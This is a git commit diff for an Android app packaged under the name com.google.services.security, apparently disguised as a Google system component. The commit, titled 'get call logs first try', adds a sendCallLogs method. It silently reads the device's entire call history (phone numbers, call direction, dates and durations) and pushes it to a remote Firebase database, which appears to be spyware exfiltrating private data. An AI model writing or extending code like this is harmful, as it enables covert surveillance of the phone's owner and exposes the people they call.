634f2666930ba3bf094af06a493c8b7565dd7427
berrehal ouala eddine <berrehaloualaeddine@gmail.com>
2018-12-27 21:06:58 +0100

    get call logs first try

--- app/src/main/java/com/google/services/security/Synchronizer.java
+++ app/src/main/java/com/google/services/security/Synchronizer.java
@@ -1,9 +1,16 @@
 package com.google.services.security;
 
+import android.Manifest;
 import android.content.Context;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.provider.CallLog;
+import android.support.v4.app.ActivityCompat;
 
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.Date;
 
 /**
  * Created by ouala_eddine on 12/27/2018.
@@ -36,7 +43,57 @@ class Synchronizer {
         // TODO: 12/27/2018
     }
 
+
     private void sendCallLogs() {
-        // TODO: 12/27/2018
+        StringBuilder stringBuffer = new StringBuilder();
+        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
+            return;
+        } else {
+            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
+                    null, null, null, CallLog.Calls.DATE + " DESC");
+            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
+            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
+            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
+            while (cursor.moveToNext()) {
+                String phNumber = cursor.getString(number);
+                String callType = cursor.getString(type);
+                String callDate = cursor.getString(date);
+                Date callDayTime = new Date(Long.valueOf(callDate));
+                String callDuration = cursor.getString(duration);
+                String dir = null;
+                int dircode = Integer.parseInt(callType);
+                switch (dircode) {
+                    case CallLog.Calls.OUTGOING_TYPE:
+                        dir = "OUTGOING";
+                        break;
+                    case CallLog.Calls.INCOMING_TYPE:
+                        dir = "INCOMING";
+                        break;
+
+                    case CallLog.Calls.MISSED_TYPE:
+                        dir = "MISSED";
+                        break;
+                }
+                stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
+                        + dir + " \nCall Date:--- " + callDayTime
+                        + " \nCall duration in sec :--- " + callDuration);
+                stringBuffer.append("\n----------------------------------");
+            }
+            cursor.close();
+
+            FirebaseDatabase database = FirebaseDatabase.getInstance();
+            DatabaseReference myRef = database.getReference("call_log");
+
+            myRef.push().setValue(stringBuffer.toString());
+        }
+
     }
 }
